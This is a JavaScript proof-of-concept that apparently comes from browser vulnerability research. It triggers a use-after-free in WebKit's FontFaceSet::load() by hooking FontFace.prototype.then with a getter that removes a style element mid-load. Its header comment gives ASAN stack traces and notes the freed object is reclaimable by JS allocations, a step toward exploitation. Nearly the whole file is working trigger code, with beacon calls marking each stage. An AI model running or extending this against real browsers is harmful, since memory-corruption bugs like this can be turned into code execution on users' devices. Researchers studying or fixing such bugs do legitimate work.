// c039: FontFaceSet::load() use-after-free (ZigZagBoi Finding 12 / issue #143).
//
// Reproduced under ASAN from Sony's own drop: CSSFontFace::status() reads a 192-byte CSSFontFace that the
// then-getter already freed via style.remove(); stack is
//   CSSFontFace::status()  CSSFontFace.h:104
//   FontFaceSet::load()    FontFaceSet.cpp:196
// with the free going through WTF::fastFree - a plain FastMalloc object, not IsoHeap, so unlike the canvas UAF
// this slot is reclaimable by JS allocations.
//
// Trigger: the thenable check on the FontFace resolves through FontFace.prototype.then, so a getter runs inside
// document.fonts.load(); removing the <style> there frees the face that load() then keeps using.
(function () {
  function send(s) { try { navigator.sendBeacon('/beacon', 'c039-' + String(s)); } catch (e) {} }
  send('boot');

  try {
    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    send('face-added');

    Object.defineProperty(FontFace.prototype, 'then', {
      configurable: true,
      get: function () {
        send('getter-enter');
        try { var st = document.getElementById('victim-style'); if (st) { st.remove(); send('style-removed'); } }
        catch (e) { send('remove-threw'); }
        try { void document.body.offsetHeight; send('layout'); } catch (e) {}
        try { document.fonts.delete(this); send('deleted'); } catch (e) {}
        send('getter-returning');
        return undefined;
      },
      set: function () {}
    });
    send('hooked');

    // a CSS face in a removable style, same family the load asks for
    var st2 = document.createElement('style');
    st2.id = 'victim-style';
    st2.textContent = '@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }';
    document.head.appendChild(st2);
    send('victim-injected');

    send('call-load');
    document.fonts.load('1em a, x', 'AB').then(
      function (list) { send('RESOLVED n=' + (list ? list.length : -1)); },
      function (e) { send('REJECTED'); }
    );
    send('load-returned');
  } catch (e) { send('outer-threw:' + e.name); }
})();
